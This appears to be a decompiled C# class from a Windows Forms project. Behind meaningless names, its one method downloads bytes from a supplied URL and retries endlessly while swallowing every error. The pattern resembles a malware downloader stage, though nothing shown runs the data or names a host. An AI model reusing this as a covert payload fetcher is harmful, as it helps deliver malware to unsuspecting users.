using System.Net;

namespace WindowsFormsApp23;

internal class Wrapper
{
	internal static Wrapper StartMapping;

	internal static byte[] IncludeExporter(string setup)
	{
		byte[] array = null;
		WebClient webClient;
		while (true)
		{
			webClient = new WebClient();
			try
			{
				array = webClient.DownloadData(setup);
			}
			catch
			{
				continue;
			}
			break;
		}
		webClient.Dispose();
		return array;
	}

	internal static bool CollectMapping()
	{
		return StartMapping == null;
	}

	internal static Wrapper ResetMapping()
	{
		return StartMapping;
	}
}
